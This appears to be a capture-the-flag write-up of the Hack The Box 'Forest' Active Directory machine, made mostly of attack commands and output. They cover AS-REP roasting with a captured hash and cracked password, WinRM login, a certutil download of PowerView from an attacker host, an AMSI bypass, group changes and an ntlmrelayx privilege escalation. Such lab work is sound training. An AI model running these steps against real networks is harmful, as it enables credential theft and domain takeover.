### re-assembly rpcclient users list
```bash
cat users | cut -d"]" -f1 | tr "[" " " | cut -d " " -f2 > users.txt
```

### Enum users
```bash
./GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -dc-ip $IP | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
```

$krb5asrep$23$svc-alfresco@HTB.LOCAL:7f409a8728db287dc66cebd404de8f76$a9b55fd6d781259c25c6d1d89ae6ec559d8b694ebba4c98700422d988a7165db39525ff0d646894a8cfb9a49d1f5e76c81eda2a3d5f31e9626eb6afdcf4e897bd03687156ea1d23f8f67132ec7d423bf66d1b9ef89a32aaa81fc36f8c9c3dd6426c53936c008834cd43d043063331fa2fa99a02cc35c597c57dc396f2f64d4f2d9d684e4c0e4e93d17e27f8dab24b00c313d373f1215baf78a537e476775f567b815b082f5ea0330bf63e18ff31b912f421707a550d69353c4163936b98edbd9e6badd2ea02e1627078897f403e3c36574c93a1ffb26e2d64d966d1350afff7e1f3821510acc

svc-alfresco@HTB.LOCAL
s3rvice

### Easy box indeed
```bash
❯ crackmapexec winrm $IP -u svc-alfresco -p s3rvice
WINRM       10.129.232.105  5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.129.232.105  5985   FOREST           [*] http://10.129.232.105:5985/wsman
WINRM       10.129.232.105  5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

### DCSync Privileges needs PowerView.ps1
```bash
certutil -urlcache -f http://10.10.16.9/PowerView.ps1 PowerView.ps1

Import-Module .\PowerView.ps1
```

```bash
net group "Exchange Windows Permissions" svc-alfresco /add /domain
net localgroup "Remote Management Users" svc-alfresco /add /domain

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync # It will fail as defender stop importing the script(PowerView.ps1) here
```

##### menu -> Bypass-4MSI
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco> Bypass-4MSI
[+] Success!
```

##### Life saver ntlmrelayx.py since none of them working
```bash
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://$IP --escalate-user svc-alfresco

# It actually runs aclpwn.py aclpwn-20211009-001222.restore 
```
Although, i did run it twice to make it work
https://rootinjail.com/blog/post/htb-forest/